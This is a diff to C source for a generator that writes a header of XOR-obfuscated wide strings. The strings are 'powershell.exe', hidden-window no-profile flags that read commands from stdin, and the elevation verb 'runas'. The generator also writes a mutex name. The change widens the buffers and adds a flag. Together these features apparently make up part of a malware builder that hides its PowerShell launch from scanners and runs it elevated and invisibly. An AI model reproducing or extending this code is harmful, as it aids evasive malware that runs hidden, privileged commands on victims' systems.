@@ -61,6 +61,8 @@ void base64(const char *src,char *dst){
   };
 };
 
+static const uint8_t strb=22;
+
 void gen_h(const char *f){
   uint8_t swapbytes[256];
   uint8_t valuebytes[256];
@@ -95,11 +97,12 @@ void gen_h(const char *f){
   dst[12]=0;
   base64(src,dst);
   fprintf(ofile,"static const wchar_t imutex[]=L\"%s\";\n",dst);
-  wchar_t xchr[16],cmd[16];
-  for(bytes=0;bytes<16;bytes++) xchr[bytes]=(wchar_t)mt();
+  fprintf(ofile,"#define STRMAX %u\n",strb);
+  wchar_t xchr[strb],cmd[strb];
+  for(bytes=0;bytes<strb;bytes++) xchr[bytes]=(wchar_t)mt();
   fprintf(ofile,"static wchar_t xchr[]={\n");
   uint8_t c=0;
-  for(bytes=0;bytes<16;bytes++){
+  for(bytes=0;bytes<strb;bytes++){
     if(bytes) fprintf(ofile,",");
     if(c==6){
       c=0;
@@ -109,15 +112,15 @@ void gen_h(const char *f){
     c++;
   }
   fprintf(ofile,"\n};\n");
-  for(bytes=0;bytes<16;bytes++) cmd[bytes]=0;
-  wchar_t a[]=L"powershell.exe",b[]=L" -w 3 -nop -c -",v[]=L"runas";
-  for(bytes=0;bytes<16;bytes++){
+  for(bytes=0;bytes<strb;bytes++) cmd[bytes]=0;
+  wchar_t a[]=L"powershell.exe",b[]=L" -w 3 -nol -nop -c -",v[]=L"runas";
+  for(bytes=0;bytes<strb;bytes++){
     if(bytes<wcslen(a)) cmd[bytes]=a[bytes]^xchr[bytes];
     else cmd[bytes]=xchr[bytes];
   };
   fprintf(ofile,"static wchar_t cmd[]={\n");
   c=0;
-  for(bytes=0;bytes<16;bytes++){
+  for(bytes=0;bytes<strb;bytes++){
     if(bytes) fprintf(ofile,",");
     if(c==6){
       c=0;
@@ -127,14 +130,14 @@ void gen_h(const char *f){
     c++;
   };
   fprintf(ofile,"\n};\n");
-  for(bytes=0;bytes<16;bytes++) cmd[bytes]=0;
-  for(bytes=0;bytes<16;bytes++){
+  for(bytes=0;bytes<strb;bytes++) cmd[bytes]=0;
+  for(bytes=0;bytes<strb;bytes++){
     if(bytes<wcslen(b)) cmd[bytes]=b[bytes]^xchr[bytes];
     else cmd[bytes]=xchr[bytes];
   };
   fprintf(ofile,"static wchar_t opt[]={\n");
   c=0;
-  for(bytes=0;bytes<16;bytes++){
+  for(bytes=0;bytes<strb;bytes++){
     if(bytes) fprintf(ofile,",");
     if(c==6){
       c=0;
@@ -144,14 +147,14 @@ void gen_h(const char *f){
     c++;
   };
   fprintf(ofile,"\n};\n");
-  for(bytes=0;bytes<16;bytes++) cmd[bytes]=0;
-  for(bytes=0;bytes<16;bytes++){
+  for(bytes=0;bytes<strb;bytes++) cmd[bytes]=0;
+  for(bytes=0;bytes<strb;bytes++){
     if(bytes<wcslen(v)) cmd[bytes]=v[bytes]^xchr[bytes];
     else cmd[bytes]=xchr[bytes];
   };
   fprintf(ofile,"static wchar_t vrb[]={\n");
   c=0;
-  for(bytes=0;bytes<16;bytes++){
+  for(bytes=0;bytes<strb;bytes++){
     if(bytes) fprintf(ofile,",");
     if(c==6){
       c=0;
